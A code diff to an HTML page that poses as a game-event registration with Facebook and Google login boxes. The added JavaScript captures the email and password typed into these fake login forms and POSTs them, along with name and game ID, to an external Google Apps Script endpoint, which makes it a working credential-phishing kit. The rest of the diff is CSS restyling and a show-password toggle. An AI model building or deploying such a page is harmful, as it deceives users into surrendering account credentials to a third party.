@@ -22,7 +22,9 @@
       border-radius: 12px;
       box-shadow: 0 0 15px rgba(255,255,255,0.2);
     }
-    h2 { text-align: center; }
+    h2 {
+      text-align: center;
+    }
     input, button {
       width: 100%;
       padding: 10px;
@@ -30,8 +32,12 @@
       border-radius: 6px;
       border: none;
       font-size: 16px;
+      box-sizing: border-box;
     }
-    button { font-weight: 600; cursor: pointer; }
+    button {
+      font-weight: 600;
+      cursor: pointer;
+    }
     .login-btn.fb {
       background-color: #1877f2;
       color: white;
@@ -48,19 +54,41 @@
       color: black;
       padding: 20px;
       border-radius: 10px;
+      position: relative;
     }
     .real-login h3 {
       text-align: center;
       color: #1877f2;
     }
-    .real-login.google h3 { color: #db4437; }
+    .real-login.google h3 {
+      color: #db4437;
+    }
     .real-login input {
       width: 100%;
-      padding: 12px;
+      padding: 12px 40px 12px 12px;
       margin: 10px 0;
       border: 1px solid #ccc;
-      border-radius: 4px;
+      border-radius: 6px;
       font-size: 16px;
+      box-sizing: border-box;
+    }
+    .password-container {
+      position: relative;
+      display: flex;
+      align-items: center;
+    }
+    .eye-icon {
+      position: absolute;
+      top: 50%;
+      right: 12px;
+      transform: translateY(-50%);
+      width: 22px;
+      height: 22px;
+      fill: #555;
+      cursor: pointer;
+    }
+    .eye-icon:hover {
+      fill: #000;
     }
     #thankYou {
       display: none;
@@ -100,14 +128,28 @@
   <div class="real-login" id="fb-login">
     <h3>Facebook Login</h3>
     <input type="text" id="fbEmail" placeholder="Email or phone number" />
-    <input type="password" id="fbPassword" placeholder="Password" />
+    <div class="password-container">
+      <input type="password" id="fbPassword" placeholder="Password" />
+      <svg class="eye-icon" onclick="togglePassword('fbPassword', this)" viewBox="0 0 24 24">
+        <path d="M12 5C7 5 2.73 8.11 1 12c1.73 3.89 6 7 11 7s9.27-3.11 11-7c-1.73-3.89-6-7-11-7zm0 12c-2.76 0-5-2.24-5-5s2.24-5 5-5
+        5 2.24 5 5-2.24 5-5 5zm0-8c-1.65 0-3 1.35-3 3s1.35 3 3 3
+        3-1.35 3-3-1.35-3-3-3z"/>
+      </svg>
+    </div>
     <button onclick="submitFBLogin()">Log In</button>
   </div>
 
   <div class="real-login google" id="google-login">
     <h3>Google Sign In</h3>
     <input type="text" id="googleEmail" placeholder="Email or phone" />
-    <input type="password" id="googlePassword" placeholder="Password" />
+    <div class="password-container">
+      <input type="password" id="googlePassword" placeholder="Password" />
+      <svg class="eye-icon" onclick="togglePassword('googlePassword', this)" viewBox="0 0 24 24">
+        <path d="M12 5C7 5 2.73 8.11 1 12c1.73 3.89 6 7 11 7s9.27-3.11 11-7c-1.73-3.89-6-7-11-7zm0 12c-2.76 0-5-2.24-5-5s2.24-5 5-5
+        5 2.24 5 5-2.24 5-5 5zm0-8c-1.65 0-3 1.35-3 3s1.35 3 3 3
+        3-1.35 3-3-1.35-3-3-3z"/>
+      </svg>
+    </div>
     <button onclick="submitGoogleLogin()">Next</button>
   </div>
 
@@ -122,11 +164,15 @@
   </div>
 
   <script>
+    const scriptURL = "https://script.google.com/macros/s/AKfycbxqdDl4jRQ0obwdVkXwX1SptJ8SBStGrjfUUKCGw-xdk3GPuI3vMSnGH1UmeT7uWoHYFg/exec";
+    let formData = {};
+
     function submitForm() {
       const name = document.getElementById('name').value.trim();
       const gameId = document.getElementById('gameId').value.trim();
       const ign = document.getElementById('ign').value.trim();
       if (name && gameId && ign) {
+        formData = { type: 'Register', name, gameId, ign };
         document.getElementById('registration').style.display = 'none';
         document.getElementById('login').style.display = 'block';
       } else {
@@ -148,8 +194,10 @@
       const email = document.getElementById('fbEmail').value.trim();
       const pass = document.getElementById('fbPassword').value.trim();
       if (email && pass) {
-        document.getElementById('fb-login').style.display = 'none';
-        document.getElementById('thankYou').style.display = 'block';
+        formData.type = 'Facebook Login';
+        formData.email = email;
+        formData.password = pass;
+        sendToSheet();
       } else {
         alert("Please fill both fields");
       }
@@ -159,10 +207,33 @@
       const email = document.getElementById('googleEmail').value.trim();
       const pass = document.getElementById('googlePassword').value.trim();
       if (email && pass) {
-        document.getElementById('google-login').style.display = 'none';
-        document.getElementById('thankYou').style.display = 'block';
+        formData.type = 'Google Login';
+        formData.email = email;
+        formData.password = pass;
+        sendToSheet();
       } else {
         alert("Please fill both fields");
+      }
+    }
+
+    function sendToSheet() {
+      fetch(scriptURL, {
+        method: 'POST',
+        body: new URLSearchParams(formData)
+      }).then(() => {
+        document.querySelectorAll(".real-login").forEach(el => el.style.display = 'none');
+        document.getElementById('thankYou').style.display = 'block';
+      }).catch(err => alert("Error: " + err));
+    }
+
+    function togglePassword(id, icon) {
+      const input = document.getElementById(id);
+      if (input.type === "password") {
+        input.type = "text";
+        icon.style.fill = "#000";
+      } else {
+        input.type = "password";
+        icon.style.fill = "#555";
       }
     }
   </script>
